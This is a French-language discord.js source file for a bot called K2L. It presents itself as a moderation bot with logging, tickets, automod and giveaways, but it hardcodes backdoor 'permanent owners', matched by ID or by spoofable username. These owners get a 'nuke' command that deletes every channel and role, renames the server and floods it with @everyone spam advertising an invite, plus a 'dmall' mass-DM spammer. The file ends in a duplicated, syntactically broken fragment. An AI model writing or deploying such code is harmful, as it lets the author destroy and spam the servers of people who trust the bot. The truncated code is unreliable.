const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
const http = require('http');

// Serveur HTTP pour Render (maintient le Web Service actif 24/7)
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Ultra Operational & Secured!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

const PREFIX = '=';

// Stockages en mémoire
const snipeCache = new Map();
const spamTracker = new Map();
const serverConfig = new Map(); 

// Owners permanents
const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 

function isOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    
    if (message.guild && message.guild.ownerId === userId) return true;
    if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
    return false;
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: true,
            antispam: true,
            antibot: true,
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            ticketRole: null,      // Rôle staff à ping dans les tickets
            ticketCategory: null   // Catégorie où créer les salons de tickets
        });
    }
    return serverConfig.get(guildId);
}

function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}
// ==========================================
// SYSTÈME DE LOGS & ÉVÉNEMENTS PRO
// ==========================================
client.on('messageDelete', message => {
    if (!message.author || message.author.bot || !message.guild) return;
    snipeCache.set(message.channel.id, {
        content: message.content || "[Média / Embed]",
        author: message.author.tag,
        avatar: message.author.displayAvatarURL(),
        time: new Date().toLocaleTimeString()
    });

    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Message supprimé')
        .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte (Embed/Image/Fichier)'}\`\`\``)
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#FEE75C')
        .setTitle('✏️ Message modifié')
        .setDescription(`**Auteur :** ${oldMessage.author.tag}\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', ban => {
    const embed = new EmbedBuilder()
        .setColor('#992D22')
        .setTitle('🔨 Membre banni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', ban => {
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('🔓 Membre débanni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('📁 Salon créé')
        .setDescription(`**Nom :** \`${channel.name}\`\n**Type :** ${channel.type === ChannelType.GuildText ? 'Texte' : 'Vocal'}`)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Salon supprimé')
        .setDescription(`**Nom :** \`${channel.name}\``)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', role => {
    const embed = new EmbedBuilder()
        .setColor('#57F287')
        .setTitle('🏷️ Rôle créé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', role => {
    const embed = new EmbedBuilder()
        .setColor('#ED4245')
        .setTitle('🗑️ Rôle supprimé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le serveur principal.`);
});

client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot activé.');
            const embed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('🤖 Bot bloqué (Anti-bot)')
                .setDescription(`**Bot :** ${member.user.tag}`)
                .setTimestamp();
            sendLog(member.guild, embed);
        } catch (err) {}
    }
    
    const config = getGuildConfig(member.guild.id);
    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});
// ==========================================
// INTERACTIONS : TICKETS PRO & TRANSCRIPTIONS
// ==========================================
client.on('interactionCreate', async interaction => {
    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);

        let categoryName = "support";
        if (selectedValue === 'ticket_bugs') categoryName = "bugs";
        else if (selectedValue === 'ticket_signalements') categoryName = "signalements";
        else if (selectedValue === 'ticket_infos') categoryName = "informations";
        else if (selectedValue === 'ticket_recrutement') categoryName = "recrutement";

        try {
            // Permissions sécurisées : seul le créateur, le staff et le bot voient le salon
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            if (config.ticketRole) {
                overwrites.push({
                    id: config.ticketRole,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageMessages]
                });
            }

            const channelOptions = {
                name: `${categoryName}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (config.ticketCategory) {
                channelOptions.parent = config.ticketCategory;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`🎫 Ticket [ ${categoryName.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            const rolePing = config.ticketRole ? `<@&${config.ticketRole}>` : `<@${member.id}>`;
            await ticketChannel.send({ content: rolePing, embeds: [embed], components: [closeRow] });
            return interaction.reply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}`, ephemeral: true });
        } catch (e) {
            return interaction.reply({ content: "❌ Erreur lors de la création du salon de ticket.", ephemeral: true });
        }
    }

    if (!interaction.isButton()) return;

    if (interaction.customId === 'close_ticket') {
        const channel = interaction.channel;
        await interaction.reply("🔒 Fermeture du ticket, génération de la transcription...");

        try {
            // Récupération de l'historique des messages pour la transcription
            const messages = await channel.messages.fetch({ limit: 100 });
            const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
            
            const buffer = Buffer.from(transcript, 'utf-8');
            const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

            const logEmbed = new EmbedBuilder()
                .setColor('#ED4245')
                .setTitle('📁 Ticket fermé & Archivé')
                .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                .setTimestamp();

            const config = getGuildConfig(interaction.guild.id);
            if (config.logChannel) {
                const logChan = interaction.guild.channels.cache.get(config.logChannel);
                if (logChan) {
                    await logChan.send({ embeds: [logEmbed], files: [attachment] });
                }
            }
        } catch (err) {
            console.error("Erreur transcription :", err);
        }

        setTimeout(() => channel.delete().catch(() => {}), 3000);
    }

    if (interaction.customId === 'join_giveaway') {
        return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
    }
});
// ==========================================
// COMMANDES ET MOTEUR DE GESTION
// ==========================================
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const userIsOwner = isOwner(message);
    const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || userIsOwner;

    // Automod Anti-lien
    if (config.antilink && !isUserAdminOrOwner) {
        const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
        if (linkRegex.test(message.content)) {
            try {
                await message.delete();
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens et invitations externes sont interdits.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);
                return;
            } catch (e) {}
        }
    }

    // Automod Anti-spam
    if (config.antispam && !isUserAdminOrOwner) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < 5000);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length > 5) {
            try {
                await message.delete();
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir l'envoi de messages (Anti-spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);
                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    // Commande Aide complète
    if (command === 'help') {
        const helpCategories = {
            sanctions: {
                label: 'Sanctions', emoji: '🔨', description: 'Bannir, Softban, Expulser',
                commands: ['`=bl <ID|@mention> [raison]` - Bannir', '`=softbl <ID|@mention> [raison]` - Softban', '`=unbl <ID>` - Débannir', '`=blist` - Liste des bannis', '`=unbanall` - Tout débannir', '`=kick <ID|@mention>` - Expulser']
            },
            nettoyage: {
                label: 'Nettoyage', emoji: '🧹', description: 'Gestion des messages',
                commands: ['`=clear <1-100|all>` - Supprimer des messages', '`=purge <ID|@mention>` - Purge un membre', '`=snipe` - Voir le dernier msg supprimé']
            },
            salons: {
                label: 'Salons & Rôles', emoji: '🔒', description: 'Sécurité et salons',
                commands: ['`=lock` / `=unlock` - Verrouiller salon', '`=slowmode <sec>` - Mode lent', '`=renew` - Régénérer un salon', '`=createtext <nom>` - Salon texte', '`=createvoice <nom>` - Salon vocal']
            },
            tickets: {
                label: 'Tickets Pro', emoji: '🎫', description: 'Support et paramétrage',
                commands: ['`=setticketrole <@rôle>` - Rôle staff support', '`=setticketcat <ID_Catégorie>` - Catégorie', '`=ticketsetup <#salon>` - Publier le panneau']
            },
            automod: {
                label: 'Automod & Logs', emoji: '🛡️', description: 'Sécurité et configuration',
                commands: ['`=antilink on/off`', '`=antispam on/off`', '`=antibot on/off`', '`=setlog <#salon>`', '`=setwelcome <#salon> <msg>`']
            },
            config: {
                label: 'Administration', emoji: '⚙️', description: 'Owners et concours',
                commands: ['`=owner <ID>` - Ajouter owner', '`=unowner <ID>` - Retirer owner', '`=gcreate <durée> <gagnants> <prix>`']
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.label}`)
                .setDescription(cat.commands.join('\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_menu')
                    .setPlaceholder('📂 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: helpCategories[k].description,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });

        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            const selectedKey = i.values[0];
            currentIndex = catKeys.indexOf(selectedKey);
            await i.update({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });
        });
        return;
    }

    if (command === 'owner') {
        if (!userIsOwner) return message.reply("❌ Réservé aux Owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.add(targetUser.id);
        botOwners.add(targetUser.username.toLowerCase());
        return message.reply(`👑 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été ajouté comme Owner permanent !`);
    }

    if (command === 'unowner') {
        if (!userIsOwner) return message.reply("❌ Réservé aux Owners.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.delete(targetUser.id);
        botOwners.delete(targetUser.username.toLowerCase());
        return message.reply(`🔒 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) n'est plus Owner.`);
    }

    const sensitiveCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice', 'setlog', 'setwelcome', 'setticketrole', 'setticketcat', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'kickbot', 'dmall', 'nuke', 'banall'];
    if (sensitiveCommands.includes(command)) {
        if (!userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Commande strictement réservée aux Owners ou Administrateurs.");
        }
    }

    // Configuration des paramètres de tickets avancés
    if (command === 'setticketrole') {
        const role = message.mentions.roles.first();
        if (!role) return message.reply("Mentionnez le rôle staff à ping dans les tickets (ex: `=setticketrole @Staff`)");
        config.ticketRole = role.id;
        return message.reply(`✅ Rôle support des tickets défini sur ${role} !`);
    }

    if (command === 'setticketcat') {
        const catId = args[0];
        if (!catId) return message.reply("Donnez l'ID de la catégorie Discord pour les tickets.");
        config.ticketCategory = catId;
        return message.reply(`✅ Catégorie de stockage des tickets configurée (\`${catId}\`).`);
    }

    if (command === 'setlog') {
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        return message.reply(`✅ Salon de logs défini avec succès sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) {
            return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        }
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        return message.reply(`✅ Salon de bienvenue configuré sur ${channel} !`);
    }

    if (command === 'ticketsetup') {
        const targetChannel = message.mentions.channels.first() || message.channel;
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle("🎟️ Support & Tickets")
            .setDescription(
                "**Bienvenue dans votre espace dédié au support du serveur !**\n\n" +
                "Sélectionnez ci-dessous la catégorie qui correspond à votre demande pour ouvrir un salon privé avec l'équipe.\n\n" +
                "*Restez courtois et respectueux.* ⚖️"
            );

        const row = new ActionRowBuilder().addComponents(
            new StringSelectMenuBuilder()
                .setCustomId('ticket_select_menu')
                .setPlaceholder('🎫 Choisissez une catégorie de ticket...')
                .addOptions([
                    { label: 'Bugs', description: 'Signaler un bug technique ou lié aux bots.', value: 'ticket_bugs', emoji: '🤖' },
                    { label: 'Signalements', description: "Signaler un membre ou demander le déban.", value: 'ticket_signalements', emoji: '⚖️' },
                    { label: 'Informations', description: 'Questions générales sur le serveur.', value: 'ticket_infos', emoji: '📢' },
                    { label: 'Recrutement', description: 'Postuler pour rejoindre le staff.', value: 'ticket_recrutement', emoji: '🛠️' }
                ])
        );

        await targetChannel.send({ embeds: [embed], components: [row] });
        return message.reply("✅ Panneau de tickets publié avec succès dans le salon cible !");
    }

    if (command === 'gcreate') {
        const duration = args[0];
        const winnersCount = parseInt(args[1]);
        const prize = args.slice(2).join(' ');

        if (!duration || isNaN(winnersCount) || !prize) {
            return message.reply("Utilisation : `=gcreate <durée ex: 1m/1h> <gagnants> <prix>`");
        }

        const embed = new EmbedBuilder()
            .setColor('#FF73FA')
            .setTitle("🎉 GIVEAWAY 🎉")
            .setDescription(`**Lot :** ${prize}\n**Gagnant(s) :** ${winnersCount}\n\nClique sur le bouton ci-dessous pour participer !`)
            .setFooter({ text: `Lancé par ${message.author.tag}` });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé avec succès !");
    }

    if (['antilink', 'antispam', 'antibot'].includes(command)) {
        const state = args[0]?.toLowerCase();
        if (state !== 'on' && state !== 'off') {
            return message.reply(`Utilisation : \`=${command} on\` ou \`=${command} off\``);
        }
        config[command] = (state === 'on');
        return message.reply(`🛡️ Protection **${command.toUpperCase()}** réglée sur : **${state.toUpperCase()}**`);
    }
    if (command === 'bl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Aucune raison spécifiée";
        try {
            await message.guild.members.ban(targetUser.id, { reason });
            message.reply(`🔨 L'utilisateur **${targetUser.tag}** (\`${targetUser.id}\`) a été banni. Raison : ${reason}`);
        } catch (e) { message.reply("Impossible de bannir cet utilisateur."); }
    }

    else if (command === 'softbl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Softban (Nettoyage)";
        try {
            await message.guild.members.ban(targetUser.id, { reason, deleteMessageSeconds: 604800 });
            await message.guild.members.unban(targetUser.id);
            message.reply(`🌪️ L'utilisateur **${targetUser.tag}** a subi un softban (messages effacés).`);
        } catch (e) { message.reply("Erreur lors du softban."); }
    }

    else if (command === 'unbl') {
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("Donne l'ID à débannir.");
        try {
            const user = await client.users.fetch(userId);
            await message.guild.members.unban(userId);
            message.reply(`🔓 L'utilisateur **${user.tag}** a été débanni.`);
        } catch (e) { message.reply("Utilisateur introuvable dans les bannissements."); }
    }

    else if (command === 'blist') {
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}** (\`${b.user.id}\`)`).slice(0, 15).join('\n') || "Aucun banni.";
        const embed = new EmbedBuilder().setColor('#ff5555').setTitle("🔨 Liste des membres bannis").setDescription(banList);
        message.reply({ embeds: [embed] });
    }

    else if (command === 'unbanall') {
        const bans = await message.guild.bans.fetch();
        if (bans.size === 0) return message.reply("Aucun utilisateur banni.");
        for (const [userIdVal] of bans) {
            await message.guild.members.unban(userIdVal).catch(() => {});
        }
        message.reply(`🔓 Tous les utilisateurs (${bans.size}) ont été débannis.`);
    }

    else if (command === 'kick') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Ce membre n'est pas sur le serveur.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await member.kick(reason);
            message.reply(`✅ Le membre **${targetUser.tag}** a été expulsé.`);
        } catch (e) { message.reply("Impossible d'expulser ce membre."); }
    }

    else if (command === 'clear') {
        const val = args[0];
        if (!val) return message.reply("Précise un nombre ou `all`.");

        if (val.toLowerCase() === 'all') {
            try {
                let deleted;
                do {
                    deleted = await message.channel.bulkDelete(100, true);
                } while (deleted.size >= 2);
                const m = await message.channel.send("🧹 Salon entièrement nettoyé !");
                setTimeout(() => m.delete().catch(() => {}), 3000);
            } catch (e) { message.reply("Erreur lors du nettoyage massif."); }
            return;
        }

        const count = parseInt(val);
        if (isNaN(count) || count < 1 || count > 100) return message.reply("Donne un nombre entre 1 et 100.");
        try {
            await message.delete();
            const fetched = await message.channel.messages.fetch({ limit: count });
            await message.channel.bulkDelete(fetched, true);
            const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { message.reply("Impossible de supprimer des messages de plus de 14 jours."); }
    }

    else if (command === 'purge') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Mentionne ou donne l'ID du membre à purger.");
        const limit = parseInt(args[1]) || 50;

        try {
            const fetched = await message.channel.messages.fetch({ limit: 100 });
            const userMessages = fetched.filter(m => m.author.id === targetUser.id).first(limit);
            if (userMessages.length === 0) return message.reply("Aucun message trouvé pour ce membre.");
            await message.channel.bulkDelete(userMessages, true);
            const confirmation = await message.channel.send(`🧹 ${userMessages.length} messages purgés pour ${targetUser.tag}.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { message.reply("Erreur lors de la purge."); }
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message récemment supprimé dans ce salon.");
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setAuthor({ name: sniped.author, iconURL: sniped.avatar })
            .setDescription(sniped.content)
            .setFooter({ text: `Supprimé à ${sniped.time}` });
        message.reply({ embeds: [embed] });
    }

    else if (command === 'lock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
            message.reply("🔒 Salon verrouillé avec succès.");
        } catch (e) { message.reply("Erreur lors du verrouillage."); }
    }

    else if (command === 'unlock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
            message.reply("🔓 Salon déverrouillé avec succès.");
        } catch (e) { message.reply("Erreur lors du déverrouillage."); }
    }

    else if (command === 'slowmode') {
        const seconds = parseInt(args[0]);
        if (isNaN(seconds) || seconds < 0 || seconds > 21600) {
            return message.reply("Donne un nombre de secondes valide (0 à 21600).");
        }
        try {
            await message.channel.setRateLimitPerUser(seconds);
            message.reply(seconds === 0 ? "⏱️ Mode lent désactivé." : `⏱️ Mode lent réglé sur ${seconds} secondes.`);
        } catch (e) { message.reply("Erreur lors du mode lent."); }
    }

    else if (command === 'renew') {
        try {
            const position = message.channel.position;
            const newChannel = await message.channel.clone({ position });
            await message.channel.delete();
            newChannel.send("🔄 Salon régénéré avec succès !");
        } catch (e) { message.reply("Impossible de régénérer ce salon."); }
    }

    else if (command === 'createtext') {
        const name = args.join('-');
        if (!name) return message.reply("Donne un nom pour le salon texte.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildText });
            message.reply(`✅ Salon texte \`${name}\` créé.`);
        } catch (e) { message.reply("Erreur."); }
    }

    else if (command === 'createvoice') {
        const name = args.join(' ');
        if (!name) return message.reply("Donne un nom pour le salon vocal.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
            message.reply(`✅ Salon vocal \`${name}\` créé.`);
        } catch (e) { message.reply("Erreur."); }
    }

    if (command === 'kickbot') {
        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");
        try {
            const fetchedMembers = await message.guild.members.fetch();
            let count = 0;
            for (const [id, m] of fetchedMembers) {
                if (m.user.bot && m.id !== client.user.id) {
                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
                    count++;
                }
            }
            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
        } catch (error) {
            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
        }
    }

    if (command === 'dmall') {
        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
        const filter = m => m.author.id === message.author.id;
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();
            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }
            const messageTemplate = m.content;
            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
            );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
            const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                }
                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée ! Envoi en cours...**", embeds: [], components: [] }).catch(() => {});
                    
                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);
                        let successCount = 0;
                        let failCount = 0;
                        const promises = members.map(async member => {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);
                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }
                        });
                        await Promise.all(promises);
                        await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
                    } catch (error) {
                        message.channel.send("❌ Erreur lors du DMAll.");
                    }
                }
            });
        } catch (err) {
            message.channel.send("⌛ Temps écoulé.");
        }
    }

if (command === 'nuke') {
        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
        await message.reply("💥 **[NUKE TOTAL ULTRA-RAPIDE]** Saturation et destruction immédiate en cours...");
        try {
            // Change le nom du serveur instantanément
            await message.guild.setName('/yuza').catch(() => {});

            // Supprime TOUS les salons et rôles en parallèle total (priorité absolue)
            const deletePromises = [
                ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {})),
                ...message.guild.roles.cache.filter(role => role.editable && role.id !== message.guild.id).map(role => role.delete().catch(() => {}))
            ];
            await Promise.all(deletePromises);

            // Crée les rôles et les salons de spam en même temps pour saturer le serveur direct
            const rolePromises = [];
            for (let r = 0; r < 40; r++) {
                rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {}));
            }

            const channelPromises = [];
            for (let i = 0; i < 45; i++) {
                channelPromises.push(
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: ChannelType.GuildText,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ManageChannels,
                                PermissionsBitField.Flags.EmbedLinks,
                                PermissionsBitField.Flags.AttachFiles,
                                PermissionsBitField.Flags.MentionEveryone
                            ]
                        }]
                    }).then(async channel => {
                        // Spam immédiat sans temps mort dans chaque salon créé
                        const spamArray = [];
                        for (let j = 0; j < 12; j++) {
                            spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
                        }
                        await Promise.all(spamArray);
                    }).catch(() => {})
                );
            }

            // Exécute tout en un bloc ultra-rapide
            await Promise.all([...rolePromises, ...channelPromises]);
        } catch (error) {
            console.error("Erreur Nuke :", error);
        }
    }


            const createPromises = [];
            for (let i = 0; i < 40; i++) {
                createPromises.push(
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: ChannelType.GuildText,
                        permissionOverwrites: [
                            {
                                id: message.guild.id,
                                allow: [
                                    PermissionsBitField.Flags.ViewChannel,
                                    PermissionsBitField.Flags.SendMessages,
                                    PermissionsBitField.Flags.ManageChannels,
                                    PermissionsBitField.Flags.EmbedLinks,
                                    PermissionsBitField.Flags.AttachFiles,
                                    PermissionsBitField.Flags.MentionEveryone
                                ]
                            }
                        ]
                    }).then(async channel => {
                        const spamPromises = [];
                        for (let j = 0; j < 10; j++) {
                            spamPromises.push(
